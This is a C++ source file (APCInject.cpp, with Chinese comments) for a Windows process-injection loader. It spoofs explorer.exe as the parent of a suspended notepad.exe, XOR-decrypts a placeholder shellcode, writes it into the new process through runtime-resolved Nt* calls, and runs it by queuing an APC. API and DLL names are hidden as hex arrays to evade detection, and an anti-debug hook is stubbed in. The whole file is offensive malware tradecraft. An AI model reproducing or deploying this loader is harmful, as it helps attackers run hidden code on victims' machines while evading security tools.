// APCInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//


#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "APCInject.h"
#include "Struct.h"
#include "Anti.h"

int main()
{
    //Anti
    //IsDebuggerPresentAPI();
    //...

    unsigned char cPayload[] = { 0xfc, 0x48 };
    char key[] = "0x15";
    DWORD pid;
    HANDLE hProcess;
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    SIZE_T lpSize;
    LPVOID lpBaseAddress = NULL;

    /*
        初始化一个进程和线程属性列表
    */
    //获取所需的进程和线程属性列表的大小
    InitializeProcThreadAttributeList(NULL, 1, 0, &lpSize);
    //为进程和线程属性列表分配内存空间
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, lpSize);
    //初始化进程和线程属性列表
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &lpSize);

    //获取Explorer的PID
    pid = GetProcessID();

    OBJECT_ATTRIBUTES objAttributes = { sizeof(objAttributes) };
    CLIENT_ID ClientId = { (HANDLE)pid,NULL };

    WCHAR	B2kD8a[] = { 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C,  0x00 };//ntdll.dll
    char	Rf6CEy[] = { 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,  0x00 };//NtOpenProcess
    NewNtOpenProcess ntOpenProcess = (NewNtOpenProcess)GetFuncAddress(GetModuleBase(B2kD8a), Rf6CEy);
    // PROCESS_CREATE_PROCESS PPID欺骗需要的参数
    NTSTATUS status = ntOpenProcess(&hProcess, PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &objAttributes, &ClientId);
    if (hProcess == NULL && status != 0x00000000)
        return 0;

    //创建进程和线程的属性列表中的指定属性
    //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS：指向指定新线程PROCESSOR_NUMBER结构的指针
    if (UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL) == 0)
        return 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    //设置目标父进程的属性
    if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
        //函数失败，返回值为零
        return 0;

    char	Req40q[] = { 0x4E, 0x74, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79,  0x00 };//NtAllocateVirtualMemory
    NewNtAllocateVirtualMemory ntAllocVMem = (NewNtAllocateVirtualMemory)GetFuncAddress(GetModuleBase(B2kD8a), Req40q);
    SIZE_T sPayloadSize = sizeof(cPayload);
    //分配缓冲区
    if (ntAllocVMem(pi.hProcess, &lpBaseAddress, 0, &sPayloadSize, MEM_COMMIT, PAGE_READWRITE) != 0x00000000)
        return 0;

    //解密payload
    XOR((char*)cPayload,sPayloadSize,key,sizeof(key));

    char	AnYupZ[] = { 0x4E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79,  0x00 };//NtWriteVirtualMemory
    NewNtWriteVirtualMemory ntWriteVMem = (NewNtWriteVirtualMemory)GetFuncAddress(GetModuleBase(B2kD8a), AnYupZ);
    //写入缓冲区
    if (ntWriteVMem(pi.hProcess, lpBaseAddress, (PVOID)cPayload, sPayloadSize, (SIZE_T*)NULL) != 0x00000000)
        return 0;

    char	DaJ1uz[] = { 0x4E, 0x74, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79,  0x00 };//NtProtectVirtualMemory
    NewNtProtectVirtualMemory ntProVMem = (NewNtProtectVirtualMemory)GetFuncAddress(GetModuleBase(B2kD8a), DaJ1uz);
    ULONG ulOldPro = 0;
    //对已提交的页面区域进行执行和读取访问
    if (ntProVMem(pi.hProcess, &lpBaseAddress, (PULONG)&sPayloadSize, PAGE_EXECUTE_READ, &ulOldPro) != 0x00000000)
        return 0;

    WCHAR	RmzXfd[] = { 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C,  0x00 };//Kernel32.dll
    char	hd2OCn[] = { 0x51, 0x75, 0x65, 0x75, 0x65, 0x55, 0x73, 0x65, 0x72, 0x41, 0x50, 0x43,  0x00 };//QueueUserAPC
    NewQueueUserAPC QUAPC = (NewQueueUserAPC)GetFuncAddress(GetModuleBase(RmzXfd), hd2OCn);
    //APC注入
    if (!QUAPC((PAPCFUNC)lpBaseAddress, pi.hThread, NULL))
        return 0;

    //恢复线程
    ResumeThread(pi.hThread);

    return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
